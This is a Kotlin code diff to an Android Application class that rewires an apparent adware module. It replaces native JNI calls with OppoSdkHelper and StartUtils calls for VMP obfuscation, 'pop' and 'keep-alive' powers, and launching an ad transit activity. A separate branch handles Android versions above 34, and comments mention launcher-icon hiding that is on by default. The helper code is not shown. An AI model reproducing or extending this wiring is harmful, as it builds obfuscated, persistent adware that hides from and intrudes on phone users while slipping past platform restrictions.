@@ -3,9 +3,9 @@ package com.deploy
 import android.app.Application
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.Bundle
 import com.deploy.tools.ToolUiInstaller
-import com.keep.up.all.NativeJniUtils
 import com.p.b.ad.runtime.AdLifecycleInstaller
 import com.p.b.base.APPContext
 import com.p.b.base.OverseaAppHost
@@ -23,7 +23,8 @@ class TheApplication : Application(), OverseaAppHost {
 
     override fun attachBaseContext(base: Context?) {
         super.attachBaseContext(base)
-        StartHelper.initVmp()
+        OppoSdkHelper.initVmp()
+        StartUtils.initVmp()
     }
 
     override fun onCreate() {
@@ -49,20 +50,22 @@ class TheApplication : Application(), OverseaAppHost {
 
     override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
         // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
-        NativeJniUtils.pageopen(intent)
-    }
 
+
+        if (Build.VERSION.SDK_INT > 34) {
+            OppoSdkHelper.startHigh(this, intent)
+        } else {
+            OppoSdkHelper.start(this, intent)
+        }
+    }
 
     override fun initPopPower() {
-        // 16_917 能力包初始化(纯 pop 能力，与图标隐藏语义分离)
-        StartHelper.init(this)
-        // 图标隐藏已由 oversea_base_module 在归因后置流程统一调度(OverseaAppHost.enableIconHide 默认开启)
-    }
+        OppoSdkHelper.init(this)
 
+    }
 
     override fun initKeepPower(app: Application) {
-        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
-        NativeJniUtils.virinit(app)
+        StartUtils.init(app)
     }
-
 }
+
